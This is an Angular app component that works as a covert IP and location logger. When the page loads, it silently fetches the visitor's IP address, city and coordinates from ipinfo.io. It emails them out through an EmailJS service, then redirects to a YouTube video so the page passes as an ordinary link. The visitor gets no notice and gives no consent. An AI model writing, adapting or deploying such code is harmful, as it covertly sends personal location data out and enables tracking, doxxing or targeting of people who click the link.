import { Component, OnInit } from '@angular/core';
import { EmailJSService } from './services/email-js.service';

@Component({
  selector: 'app-root',
  imports: [],
  templateUrl: './app.component.html',
  styleUrl: './app.component.css'
})
export class AppComponent implements OnInit {

  ipData: {ip: string, city: string, location: string} ={ip: '', city: '', location: ''};

  constructor(private emailService: EmailJSService) { }

  ngOnInit(): void {
    this.getIp().then((ipData) => {
      this.emailService.sendEmail(ipData)
        .then(() => {
          window.location.href = 'https://youtu.be/_PF6KSQFR8o?si=1o2LkDghkIMZuRxV'
        })
        .catch((error) => {
          console.log('Failed..');
        });
    });
  }

  async getIp(): Promise<any> {
    const response = await fetch('https://ipinfo.io/json');
    if (!response.ok) {
      console.log("Failed");
    }
    const data = await response.json();
    this.ipData.ip = data.ip;
    this.ipData.city = data.city;
    this.ipData.location = data.loc;
    return this.ipData;
  }

}
